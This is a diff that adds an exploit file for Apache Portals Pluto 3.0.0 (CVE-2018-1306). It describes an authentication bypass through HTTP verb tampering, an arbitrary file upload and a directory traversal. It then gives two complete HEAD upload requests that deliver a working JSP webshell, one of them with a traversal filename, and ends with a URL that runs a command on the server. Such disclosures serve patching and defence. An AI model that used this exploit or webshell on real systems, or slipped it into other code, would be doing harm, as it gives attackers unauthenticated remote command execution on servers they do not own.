@@ -1,0 +1,99 @@
+# Exploit Title: Apache Portals Pluto 3.0.0 - Remote Code Execution
+# Date: 2018-09-12
+# Exploit Author: Che-Chun Kuo
+# Vendor Homepage: https://portals.apache.org/pluto/
+# Software Link: http://archive.apache.org/dist/portals/pluto/
+# Version: 3.0.0
+# Tested on: Windows
+# Advisory: https://portals.apache.org/pluto/security.html
+# Other Vulnerability Types: Authentication bypass, directory traversal, arbitrary file upload
+# CVE: CVE-2018-1306
+
+# Vulnerability 1: Authentication bypass via HTTP verb tampering
+# Description: Apache Pluto uses web.xml security constraints to control access to resources. 
+# These security constraints have been insecurely defined allowing authentication to be bypassed. 
+# When specific http methods are listed within a security constraint, then only those 
+# methods are protected. Pluto defines the following http methods: GET, POST, and PUT. 
+# Since the HEAD method is not listed, a request with a HTTP HEAD method effectively 
+# circumvents the security policy.
+
+# Vulnerability 2: Remote code execution via arbitrary file upload
+# Description: An attacker can call the PortletV3AnnotatedDemo Multipart Portlet and upload 
+# an arbitrary file. The uploaded file is directly accessible within 
+# the /PortletV3AnnotatedDemo/temp/ directory. This technique allows an unauthenticated 
+# attacker to install a malicious JSP file and remotely execute code on a server running Apache Pluto.
+# Insecure Remediation: This vulnerability was mitigated by moving the /temp directory 
+# outside the /webapps directory and under the Tomcat directory. 
+
+# Vulnerability 3: Directory traversal in multipart file upload 
+# Description: Apache Pluto's multipart file uploader is vulnerable to directory traversal. 
+# An attacker is able to upload a file outside the default /temp directory to an arbitrary location 
+# on the filesystem. The following filename will drop a JSP webshell 
+# into the /webapps/pluto public directory: filename="../../../webapps/pluto/jspshell.jsp". 
+# Leveraging this technique, remote code execution via webshell is still possible despite 
+# remediation in Vulnerability 2. 
+
+# PROOF OF CONCEPT
+# UPLOAD REQUEST 1 - TEMP DIR INSIDE WEBROOT
+
+HEAD /pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0 HTTP/1.1
+Host: localhost:8080
+Content-Type: multipart/form-data; boundary=XX
+Content-Length: 727
+
+--XX
+Content-Disposition: form-data; name="file"; filename="jspshell.jsp"
+Content-Type: application/octet-stream
+
+<FORM METHOD=GET ACTION='jspshell.jsp'>
+CMD: <INPUT name='cmd' type=text  value="cmd /c dir">
+<INPUT type=submit value='Run'></FORM>
+<%@ page import="java.io.*" %>
+<%
+	String cmd = "whoami";
+	String param = request.getParameter("cmd");
+	if (param != null){ cmd = param; }
+	String s = null;
+	String output = "";
+	try {
+	Process p = Runtime.getRuntime().exec(cmd);
+	BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	while((s = sI.readLine()) != null) { output += s+"\r\n"; }
+	}  catch(IOException e) { e.printStackTrace(); }
+%>
+<pre><%=output %></pre>
+--XX--
+
+# UPLOAD REQUEST 2 - TEMP DIR OUTSIDE WEBROOT
+
+HEAD /pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0 HTTP/1.1
+Host: localhost:8080
+Content-Type: multipart/form-data; boundary=XX
+Content-Length: 748
+
+--XX
+Content-Disposition: form-data; name="file"; filename="../../../webapps/pluto/jspshell.jsp"
+Content-Type: application/octet-stream
+
+<FORM METHOD=GET ACTION='jspshell.jsp'>
+CMD: <INPUT name='cmd' type=text  value="cmd /c dir">
+<INPUT type=submit value='Run'></FORM>
+<%@ page import="java.io.*" %>
+<%
+	String cmd = "whoami";
+	String param = request.getParameter("cmd");
+	if (param != null){ cmd = param; }
+	String s = null;
+	String output = "";
+	try {
+	Process p = Runtime.getRuntime().exec(cmd);
+	BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	while((s = sI.readLine()) != null) { output += s+"\r\n"; }
+	}  catch(IOException e) { e.printStackTrace(); }
+%>
+<pre><%=output %></pre>
+--XX--
+
+# EXECUTE CMD
+----------------------------------------
+http://localhost:8080/pluto/jspshell.jsp?cmd=hostname
